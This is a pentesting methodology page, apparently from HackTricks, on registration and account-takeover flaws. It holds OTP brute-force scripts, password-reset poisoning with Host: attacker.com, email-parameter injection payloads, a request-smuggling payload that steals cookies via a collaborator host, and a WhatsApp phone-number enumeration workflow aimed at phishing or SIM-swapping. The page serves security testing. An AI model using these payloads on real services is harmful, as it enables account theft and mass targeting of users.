# 登録と乗っ取りの脆弱性

{{#include ../banners/hacktricks-training.md}}

## 登録の乗っ取り

### Duplicate Registration

- 既存の username を使って生成を試す
- email を変化させて確認する:
- uppercase
- +1@
- email にドットを追加
- email 名に特殊文字を入れる (%00, %09, %20)
- email の後に空白文字を入れる: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- メールプロバイダの正規化トリックを試す（サービス依存）:
- Gmail はドットとサブアドレッシングを無視する: `victim+1@gmail.com`, `v.ic.tim@gmail.com` は `victim@gmail.com` に配信される
- 一部プロバイダは local-part が大文字小文字を区別しない
- 一部プロバイダは unicode の confusables を受け付ける。homoglyphs や soft hyphen `\u00AD` を local-part 内で試す
- これらを悪用して、ユニークネスチェックを回避したり、重複アカウント/workspace 招待を取得したり、乗っ取り準備中に被害者のサインアップをブロック（一時的な DoS）する

### Username Enumeration

アプリ内で既に登録されている username を見つけられるか確認する。

- 異なるエラーメッセージや HTTP ステータスコード
- タイミング差（既存ユーザは IdP/DB へのルックアップをトリガーする場合がある）
- 既知の emails に対する登録フォームのプロファイルデータ自動入力
- team/invite フローを確認：email を入力するとアカウントの有無が明らかになる場合がある

### Password Policy

ユーザ作成時に password policy を確認する（弱いパスワードを使えるかを確認）。\
その場合は credentials を bruteforce することを試みるかもしれない。

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)を参照して、登録フォームでの **SQL Injections** を使ったアカウント乗っ取りの試行や情報抽出方法を学ぶ。

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

登録後に email を変更して、この変更が正しく検証されるか、任意の email に変更できてしまうかを確認する。

### More Checks

- **disposable emails**（mailinator, yopmail, 1secmail など）を使えるか、または `victim+mailinator@gmail.com` のようなサブアドレッシングでブロックリストを回避できるか確認する
- **長い** **password** (>200) は **DoS** を引き起こす可能性がある
- **アカウント作成時のレート制限**を確認する
- username@**burp_collab**.net を使い、**callback** を解析する
- 電話番号検証が使われている場合、phone parsing/injection のエッジケースを確認する

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Phone-number–centric messengers はクライアントが連絡先を同期するたびに **presence oracle** を露呈する。WhatsApp の discovery リクエストをリプレイすると歴史的に **>100M lookups per hour** を達成し、ほぼ完全なアカウント列挙を可能にした。

**Attack workflow**

1. 公式クライアントを Instrument して、address-book upload request（正規化された E.164 番号の認証済み blob）をキャプチャする。攻撃者生成の番号でリプレイしつつ同じ cookies/device token を再利用する。
2. リクエストごとに番号をバッチ化する：WhatsApp は数千の識別子を受け付け、registered/unregistered に加えメタデータ（business, companion など）を返す。レスポンスをオフラインで解析して、被害者にメッセージを送らずにターゲットリストを作成する。
3. SIM banks、cloud devices、または residential proxies で横方向にスケールして列挙を行い、アカウント単位/IP/ASN のスロットリングがトリガーされないようにする。

**Dialing-plan modeling**

各国のダイヤルプランをモデル化して無効な候補を省く。NDSS データセット（`country-table.*`）は国コード、採用密度、プラットフォーム分布を一覧しているので、高ヒット範囲を優先できる。Example seeding code:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Prioritise prefixes that match real allocations (Mobile Country Code + National Destination Code) before querying the oracle to keep throughput useful.

**Turning enumerations into targeted attacks**

- Feed leaked phone numbers (e.g., Facebook’s 2021 breach) into the oracle to learn which identities are still active before phishing, SIM-swapping, or spamming.
- 国/OS/アプリ種別でセンサスを分割して、SMSフィルタリングが弱い、またはWhatsApp Businessの導入率が高い地域を見つけ、地域特化のsocial engineeringを行う。

**Public-key reuse correlation**

WhatsApp exposes each account’s X25519 identity key during session setup. Request identity material for every enumerated number and deduplicate the public keys to reveal account farms, cloned clients, or insecure firmware—shared keys deanonymize multi-SIM operations.

## Weak Email/Phone Verification (OTP/Magic Link)

Registration flows often verify ownership via a numeric OTP or a magic-link token. Typical flaws:

- Guessable or short OTP (4–6 digits) with no effective rate limiting or IP/device tracking. Try parallel guesses and header/IP rotation.
- OTP reuse across actions or accounts, or not bound to the specific user/action (e.g., same code works for login and signup, or works after email is changed).
- Multi-value smuggling: some backends accept multiple codes and verify if any matches. Try:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: distinguish wrong vs expired vs wrong-user codes by status/message/body length.
- Tokens not invalidated after success or after password/email change.
- Verification token not tied to user agent/IP allowing cross-origin completion from attacker-controlled pages.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
並列/同時の推測で連続ロックアウトを回避する（Burp の Turbo Intruder を使用）:

<details>
<summary>6‑digit OTP 試行を大量に送信する Turbo Intruder スニペット</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: 同じ有効なOTPを2つのセッションで同時に送信します。時折、一方のセッションが検証された攻撃者アカウントになり、被害者側のフローも成功することがあります。
- Also test Host header poisoning on verification links (same as reset poisoning below) to leak or complete verification on attacker controlled host. 攻撃者が制御するホスト上で検証をleakまたは完了できるか確認するため、verification links上でHost header poisoningもテストしてください。

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

被害者がアカウントを作成する前に攻撃者が被害者のメールに対して操作を行い、その後アクセスを取り戻すことで発生する強力な問題群があります。

Key techniques to test (adapt to the target’s flows):

- Classic–Federated Merge
- 攻撃者: 被害者のメールでclassicアカウントを登録し、パスワードを設定する
- 被害者: 後で同じメールでSSOでサインアップする
- 不適切なマージは両者がログイン状態のままになったり、攻撃者のアクセスが復活する可能性がある
- Unexpired Session Identifier
- 攻撃者: アカウントを作成して長期間有効なセッションを維持する（ログアウトしない）
- 被害者: アカウントを回復／パスワードを設定し利用を開始する
- リセットやMFA有効化後も古いセッションが有効なままかをテストする
- Trojan Identifier
- 攻撃者: 事前作成したアカウントに二次識別子を追加する（電話、追加メール、または攻撃者のIdPをリンク）
- 被害者: パスワードをリセットする；攻撃者は後でそのtrojan identifierを使ってリセット／ログインする
- Unexpired Email Change
- 攻撃者: email‑changeを攻撃者のメールへ開始し、確認を保留する
- 被害者: アカウントを回復して使用を開始する
- 攻撃者: 後で保留中のemail‑changeを完了してアカウントを奪取する
- Non‑Verifying IdP
- 攻撃者: メール所有権を検証しないIdPを使って `victim@…` を主張する
- 被害者: classicルートでサインアップする
- サービスが `email_verified` を確認したりローカル検証を行わずにメールでマージする場合がある

Practical tips

- web/mobileのバンドルからフローとエンドポイントを収集してください。classic signup、SSOのリンク、email/phoneの変更、password resetのエンドポイントを探します。
- 他のフローを検査している間にセッションを維持するための現実的な自動化を作成してください。
- SSOテストのために、テスト用のOIDC providerを立て、被害者アドレスの `email` クレームと `email_verified=false` を含むトークンを発行して、RPが未検証のIdPを信頼するかどうかを確認してください。
- パスワードリセットやメール変更の後は、以下を確認してください:
- 他のすべてのセッションとトークンが無効化されていること、
- 保留中のemail/phone変更の機能がキャンセルされていること、
- 以前にリンクされていたIdP/メール/電話が再度検証されていること。

Note: これらの手法の詳細な手法論とケーススタディは、Microsoftのpre‑hijacking研究によって文書化されています（参考文献は末尾参照）。

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Burp Suiteでpassword resetのリクエストをインターセプトする
2. Burp Suiteで次のヘッダを追加または編集する: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. 変更したヘッダでリクエストを転送する\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. _host header_ に基づいたpassword resetのURL（例: `https://attacker.com/reset-password.php?token=TOKEN`）がないか確認する

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. 攻撃者は自分のアカウントでログインし、**パスワード変更**機能に移動する必要があります。
2. Burp Suiteを起動してリクエストをインターセプトする
3. Send it to the repeater tab and edit the parameters : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

パスワードリセットトークンはランダムに生成され、毎回ユニークであるべきです。\
トークンが有効期限で切れるか、常に同じかを確認してください。場合によっては生成アルゴリズムが弱く推測可能なことがあります。アルゴリズムに使用される可能性のある変数は以下の通りです。

- タイムスタンプ
- ユーザーID
- ユーザーのメールアドレス
- 名と姓
- 生年月日
- 暗号化
- 数字のみ
- 小さなトークン列（文字は \[A-Z,a-z,0-9] の範囲）
- トークンの再利用
- トークンの有効期限

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. API/UIを使って特定のメール（例: test@mail.com）に対してパスワードリセットリクエストを発行する
2. サーバーのレスポンスを確認し、`resetToken`をチェックする
3. そのトークンを以下のようなURLで使用する: `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. 被害者のユーザー名と同一だが、ユーザー名の前後に空白を挿入したユーザー名でシステムに登録する。例: `"admin "`
2. 悪意のあるユーザー名でパスワードリセットを要求する。
3. 自分のメールに送られてきたトークンを使って被害者のパスワードをリセットする。
4. 新しいパスワードで被害者のアカウントにログインする。

プラットフォーム CTFd はこの攻撃に対して脆弱でした。\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. アプリケーションまたはサブドメイン内でXSSを見つける（クッキーが親ドメインにスコープされている場合に有効）: `*.domain.com`
2. 現在の **sessions cookie** を leak する
3. そのcookieを使ってユーザーとして認証する

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. HTTP Request Smuggling のタイプ (CL, TE, CL.TE) を検出するために **smuggler** を使用する\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. 次のデータで `POST / HTTP/1.1` を上書きするリクエストを作成する:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` — 目的は被害者を burpcollab へ open redirect させ、クッキーを盗むこと
3. Final request could look like the following
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone によるこのバグの悪用報告\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### アカウント乗っ取り via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. CSRF用のペイロードを作成する。例: “HTML form with auto submit for a password change”
2. ペイロードを送信する

### アカウント乗っ取り via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token がユーザ認証に使われている可能性がある。

- JWT の User ID / Email を別のものに書き換える
- 弱い JWT 署名がないか確認する


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

提供された email が既に存在する場合、一部の signup handlers は upsert を実行する。もし endpoint が email と password を含む最小限の body を受け入れ、所有権検証を強制しない場合、被害者の email を送信すると認証前にパスワードが上書きされる。

- 発見: バンドルされた JS（またはモバイルアプリのトラフィック）から endpoint 名を収集し、次に ffuf/dirsearch を使って /parents/application/v4/admin/FUZZ のようなベースパスを fuzz する。
- 手法のヒント: GET が "Only POST request is allowed." のようなメッセージを返す場合、それは正しい HTTP verb を示しており、JSON body が期待されていることが多い。
- 実際に確認された最小限の body:
```json
{"email":"victim@example.com","password":"New@12345"}
```
PoC の例:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
影響: Full Account Takeover (ATO) — reset token、OTP、または email verification を一切必要としない。

## 参考

- [重要な Password Reset Bug を見つけた方法 (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (2022年5月)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: セキュリティとプライバシーのための30億アカウント列挙 (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
